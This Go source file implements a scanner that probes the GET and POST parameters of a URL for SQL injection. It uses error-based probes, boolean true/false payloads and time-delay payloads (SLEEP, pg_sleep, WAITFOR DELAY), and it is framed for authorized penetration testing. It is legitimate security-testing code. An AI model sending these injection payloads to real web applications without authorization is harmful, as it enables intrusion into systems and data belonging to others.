// Package scanner implements SQL injection detection for authorized
// penetration testing. It supports error-based, boolean-based blind and
// time-based blind techniques using only the Go standard library so the
// resulting binary is fully static and portable to Kali/Linux.
package scanner

import (
	"context"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// Technique identifies a detection family.
type Technique string

const (
	Error   Technique = "error"
	Boolean Technique = "boolean"
	Time    Technique = "time"
)

// Options configures a scan run.
type Options struct {
	URL        string
	Method     string
	Data       string // POST body, e.g. "id=1&name=x"
	Techniques []Technique
	Delay      int           // seconds for time-based payloads
	Timeout    time.Duration // per-request timeout
	Throttle   time.Duration // pause between requests
	Headers    map[string]string
	Cookie     string
	UserAgent  string
	Proxy      string
	Insecure   bool
}

// Finding is a single detected (or suspected) injection point.
type Finding struct {
	Param     string    `json:"param"`
	Location  string    `json:"location"` // GET or POST
	Technique Technique `json:"technique"`
	DBMS      string    `json:"dbms"`
	Payload   string    `json:"payload"`
	Evidence  string    `json:"evidence"`
}

// Event is a progress update emitted during a scan. Either Finding or Log is set.
type Event struct {
	Log     string
	Finding *Finding
}

var errorSignatures = map[string][]*regexp.Regexp{
	"MySQL": compile(
		`SQL syntax.*MySQL`, `Warning.*mysqli?`, `MySqlException`,
		`valid MySQL result`, `check the manual that corresponds to your (MySQL|MariaDB)`,
	),
	"PostgreSQL": compile(`PostgreSQL.*ERROR`, `pg_query\(\)`, `pg_exec\(\)`, `PSQLException`),
	"MSSQL": compile(
		`Driver.*SQL[\-\_ ]*Server`, `OLE DB.*SQL Server`, `Unclosed quotation mark`,
		`Microsoft SQL Native Client error`, `System\.Data\.SqlClient\.SqlException`,
	),
	"Oracle": compile(`\bORA-\d{5}`, `Oracle error`, `quoted string not properly terminated`),
	"SQLite": compile(
		`SQLite/JDBCDriver`, `SQLite\.Exception`, `System\.Data\.SQLite\.SQLiteException`,
		`sqlite3.OperationalError`, `unrecognized token:`,
	),
}

var errorProbes = []string{"'", "\"", "')", "';", "`", "\\"}

var booleanPayloads = []struct{ True, False string }{
	{"' AND '1'='1", "' AND '1'='2"},
	{"\" AND \"1\"=\"1", "\" AND \"1\"=\"2"},
	{" AND 1=1", " AND 1=2"},
	{"') AND ('1'='1", "') AND ('1'='2"},
}

// %d is replaced with the configured delay.
var timePayloads = []struct{ Template, Dialect string }{
	{"' AND SLEEP(%d)-- -", "MySQL/Generic"},
	{"\" AND SLEEP(%d)-- -", "MySQL/Generic"},
	{"' AND pg_sleep(%d)-- -", "PostgreSQL"},
	{"'; WAITFOR DELAY '0:0:%d'-- -", "MSSQL"},
	{" AND SLEEP(%d)", "MySQL/Generic"},
}

func compile(patterns ...string) []*regexp.Regexp {
	out := make([]*regexp.Regexp, 0, len(patterns))
	for _, p := range patterns {
		out = append(out, regexp.MustCompile("(?i)"+p))
	}
	return out
}

// Scanner drives requests against a single target.
type Scanner struct {
	opts      Options
	client    *http.Client
	base      *url.URL
	getParams url.Values
	postParms url.Values
}

// New builds a Scanner from Options, applying sensible defaults.
func New(opts Options) (*Scanner, error) {
	if opts.Method == "" {
		opts.Method = "GET"
	}
	opts.Method = strings.ToUpper(opts.Method)
	if opts.Data != "" && opts.Method == "GET" {
		opts.Method = "POST" // a body implies POST
	}
	if opts.Delay <= 0 {
		opts.Delay = 5
	}
	if opts.Timeout <= 0 {
		opts.Timeout = 30 * time.Second
	}

	base, err := url.Parse(opts.URL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}
	if base.Scheme != "http" && base.Scheme != "https" {
		return nil, fmt.Errorf("URL must start with http:// or https://")
	}

	transport := &http.Transport{}
	if opts.Insecure {
		transport.TLSClientConfig = insecureTLS()
	}
	if opts.Proxy != "" {
		pu, err := url.Parse(opts.Proxy)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy: %w", err)
		}
		transport.Proxy = http.ProxyURL(pu)
	}

	postParms := url.Values{}
	if opts.Data != "" {
		postParms, _ = url.ParseQuery(opts.Data)
	}

	return &Scanner{
		opts:      opts,
		client:    &http.Client{Timeout: opts.Timeout, Transport: transport},
		base:      base,
		getParams: base.Query(),
		postParms: postParms,
	}, nil
}

type param struct {
	name     string
	location string // GET or POST
}

// Params returns every testable parameter.
func (s *Scanner) Params() []param {
	var out []param
	for k := range s.getParams {
		out = append(out, param{k, "GET"})
	}
	for k := range s.postParms {
		out = append(out, param{k, "POST"})
	}
	return out
}

func (s *Scanner) originalValue(name string) string {
	if v := s.getParams.Get(name); v != "" {
		return v
	}
	return s.postParms.Get(name)
}

type response struct {
	body    string
	elapsed time.Duration
	ok      bool
}

func (s *Scanner) send(ctx context.Context, injectParam, value string) response {
	get := cloneValues(s.getParams)
	post := cloneValues(s.postParms)
	if injectParam != "" {
		if get.Has(injectParam) {
			get.Set(injectParam, value)
		} else if post.Has(injectParam) {
			post.Set(injectParam, value)
		}
	}

	u := *s.base
	u.RawQuery = get.Encode()

	if s.opts.Throttle > 0 {
		time.Sleep(s.opts.Throttle)
	}

	var body io.Reader
	if s.opts.Method == "POST" {
		body = strings.NewReader(post.Encode())
	}
	req, err := http.NewRequestWithContext(ctx, s.opts.Method, u.String(), body)
	if err != nil {
		return response{}
	}
	s.applyHeaders(req)
	if s.opts.Method == "POST" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	start := time.Now()
	resp, err := s.client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		// A timeout is still a meaningful signal for time-based tests.
		return response{elapsed: elapsed, ok: false}
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(io.LimitReader(resp.Body, 2<<20)) // cap at 2 MiB
	return response{body: string(data), elapsed: elapsed, ok: true}
}

func (s *Scanner) applyHeaders(req *http.Request) {
	ua := s.opts.UserAgent
	if ua == "" {
		ua = "floppy/1.0 (whoami-floppy; authorized-pentest)"
	}
	req.Header.Set("User-Agent", ua)
	for k, v := range s.opts.Headers {
		req.Header.Set(k, v)
	}
	if s.opts.Cookie != "" {
		req.Header.Set("Cookie", s.opts.Cookie)
	}
}

func matchError(text string) string {
	for dbms, patterns := range errorSignatures {
		for _, p := range patterns {
			if p.MatchString(text) {
				return dbms
			}
		}
	}
	return ""
}

// Run executes the scan, streaming progress on the returned channel.
func (s *Scanner) Run(ctx context.Context) <-chan Event {
	out := make(chan Event, 16)
	go func() {
		defer close(out)
		params := s.Params()
		if len(params) == 0 {
			out <- Event{Log: "no parameters found to test (add them to the URL query or --data)"}
			return
		}
		enabled := map[Technique]bool{}
		for _, t := range s.opts.Techniques {
			enabled[t] = true
		}

		for _, p := range params {
			select {
			case <-ctx.Done():
				return
			default:
			}
			out <- Event{Log: fmt.Sprintf("testing parameter %q (%s)", p.name, p.location)}
			baseline := s.send(ctx, p.name, s.originalValue(p.name))
			if !baseline.ok {
				out <- Event{Log: fmt.Sprintf("  could not baseline %q; skipping", p.name)}
				continue
			}

			var f *Finding
			if enabled[Error] {
				f = s.testError(ctx, p, baseline)
			}
			if f == nil && enabled[Boolean] {
				f = s.testBoolean(ctx, p, baseline)
			}
			if f == nil && enabled[Time] {
				f = s.testTime(ctx, p, baseline)
			}

			if f != nil {
				out <- Event{Finding: f}
			} else {
				out <- Event{Log: fmt.Sprintf("  no injection detected on %q", p.name)}
			}
		}
	}()
	return out
}

func (s *Scanner) testError(ctx context.Context, p param, baseline response) *Finding {
	if matchError(baseline.body) != "" {
		return nil // target already emits errors; too noisy to trust
	}
	orig := s.originalValue(p.name)
	for _, probe := range errorProbes {
		r := s.send(ctx, p.name, orig+probe)
		if !r.ok {
			continue
		}
		if dbms := matchError(r.body); dbms != "" {
			return &Finding{
				Param: p.name, Location: p.location, Technique: Error, DBMS: dbms,
				Payload:  orig + probe,
				Evidence: fmt.Sprintf("%s error string surfaced after injecting %q", dbms, probe),
			}
		}
	}
	return nil
}

func (s *Scanner) testBoolean(ctx context.Context, p param, baseline response) *Finding {
	orig := s.originalValue(p.name)
	for _, bp := range booleanPayloads {
		tr := s.send(ctx, p.name, orig+bp.True)
		fr := s.send(ctx, p.name, orig+bp.False)
		if !tr.ok || !fr.ok {
			continue
		}
		trueSim := similarity(baseline.body, tr.body)
		falseSim := similarity(baseline.body, fr.body)
		tfSim := similarity(tr.body, fr.body)
		if trueSim > 0.95 && tfSim < 0.95 && (trueSim-falseSim) > 0.05 {
			return &Finding{
				Param: p.name, Location: p.location, Technique: Boolean, DBMS: "unknown",
				Payload: fmt.Sprintf("%s  /  %s", orig+bp.True, orig+bp.False),
				Evidence: fmt.Sprintf("TRUE~base=%.2f FALSE~base=%.2f TRUE~FALSE=%.2f",
					trueSim, falseSim, tfSim),
			}
		}
	}
	return nil
}

func (s *Scanner) testTime(ctx context.Context, p param, baseline response) *Finding {
	orig := s.originalValue(p.name)
	delay := float64(s.opts.Delay)
	threshold := math.Max(delay-0.5, baseline.elapsed.Seconds()+delay*0.6)
	for _, tp := range timePayloads {
		payload := fmt.Sprintf(tp.Template, s.opts.Delay)
		r := s.send(ctx, p.name, orig+payload)
		if r.elapsed.Seconds() < threshold {
			continue
		}
		// Confirm once to rule out a one-off slow response.
		r2 := s.send(ctx, p.name, orig+payload)
		if r2.elapsed.Seconds() >= threshold {
			return &Finding{
				Param: p.name, Location: p.location, Technique: Time, DBMS: tp.Dialect,
				Payload:  orig + payload,
				Evidence: fmt.Sprintf("response delayed ~%.1fs (asked for %ds)", r2.elapsed.Seconds(), s.opts.Delay),
			}
		}
	}
	return nil
}

func cloneValues(v url.Values) url.Values {
	out := make(url.Values, len(v))
	for k, vals := range v {
		cp := make([]string, len(vals))
		copy(cp, vals)
		out[k] = cp
	}
	return out
}
